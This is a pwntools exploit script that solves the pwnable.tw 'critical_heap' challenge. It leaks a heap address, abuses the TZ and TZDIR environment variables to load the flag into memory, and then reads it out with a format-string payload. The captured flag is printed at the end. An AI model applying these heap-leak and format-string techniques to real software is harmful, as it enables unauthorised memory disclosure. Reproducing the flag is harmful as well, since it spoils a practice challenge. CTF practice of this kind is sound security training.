from pwn import *

elf = ELF("share/critical_heap")

r = remote('chall.pwnable.tw', 10500)


def create_heap(name, type, content=None):
    ''' type : 1 normal, 2 clock, 3 system
    context: only need when type = 1 '''

    r.sendlineafter(b'Your choice : ', b'1')
    r.sendlineafter(b'Name of heap:', name)
    r.sendlineafter(b'Your choice : ', str(type).encode())
    if type == 1:
        r.sendafter(b'Content of heap :', content)


def show_heap(index):
    r.sendlineafter(b'Your choice : ', b'2')
    r.sendlineafter(b'Index of heap :', str(index).encode())


def delete_heap(index):
    r.sendlineafter(b'Your choice : ', b'5')
    r.sendlineafter(b'Index of heap :', str(index).encode())

with log.progress("Leaking heap address") as p:
    create_heap(b'system_heap', 3)

    # play heap
    r.sendlineafter(b'Your choice : ', b'4')
    r.sendlineafter(b'Index of heap :', b'0')
    # set
    r.sendlineafter(b'Your choice : ', b'1')
    r.sendlineafter(b'Give me a name for the system heap :', b'XSEC')
    r.sendlineafter(b'Give me a value for this name :', b'OVESEC')
    # get
    r.sendlineafter(b'Your choice : ', b'4')
    r.sendlineafter(b"What's name do you want to see :", b'XSEC')
    # return
    r.sendlineafter(b'Your choice : ', b'5')

    delete_heap(0)

    create_heap(b'normal_heap', 1, b'A' * 8)  # 0

    show_heap(0)
    r.recvuntil(b'A' * 8)
    leak_addr = u32(r.recv(4))
    p.success(hex(leak_addr))

with log.progress("Leaking flag address") as p:
    create_heap(b'system_heap2', 3)  # 1
    # play heap
    r.sendlineafter(b'Your choice : ', b'4')
    r.sendlineafter(b'Index of heap :', b'1')
    # set
    r.sendlineafter(b'Your choice : ', b'1')
    r.sendlineafter(b'Give me a name for the system heap :', b'TZDIR')
    r.sendlineafter(b'Give me a value for this name :', b'/home/critical_heap++')
    # set
    r.sendlineafter(b'Your choice : ', b'1')
    r.sendlineafter(b'Give me a name for the system heap :', b'TZ')
    r.sendlineafter(b'Give me a value for this name :', b'flag')
    # return
    r.sendlineafter(b'Your choice : ', b'5')

    create_heap(b'clock_heap', 2)  # 2

    # flag_offset = 0x47b
    flag_offset = 0x4ab
    flag_addr = leak_addr + flag_offset

    p.success(hex(flag_addr))

with log.progress("Dumping flag") as p:
    # play heap
    r.sendlineafter(b'Your choice : ', b'4')
    r.sendlineafter(b'Index of heap :', b'0')
    # change
    r.sendlineafter(b'Your choice : ', b'2')
    r.sendlineafter(b'Content :', b'%c%c%c%c%c%c%c%c%c%c%c%c%sAAAAAA' + p64(flag_addr))
    # show
    r.sendlineafter(b'Your choice : ', b'1')

    r.recvuntil(b'Your choice : ')
    p.success()
    r.interactive()

# FLAG --> FLAG{Oh_y0u_f1nd_th3_s3cr3t_1n_loc4ltim3}
